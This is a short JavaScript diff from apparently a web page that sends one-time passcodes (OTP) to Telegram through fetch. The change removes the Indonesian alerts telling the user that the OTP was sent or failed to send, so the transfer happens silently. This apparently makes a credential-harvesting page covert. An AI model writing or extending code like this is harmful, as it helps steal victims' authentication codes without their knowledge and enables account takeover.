@@ -184,10 +184,10 @@
       const resp = await fetch(url);
       const data = await resp.json();
       if (data.ok) {
-        alert("OTP terkirim ke Telegram.");
+
       } else {
         console.error("Telegram response error:", data);
-        alert("Gagal mengirim ke Telegram. Cek console.");
+      
       }
     } catch (err) {
       console.error("Fetch error:", err);
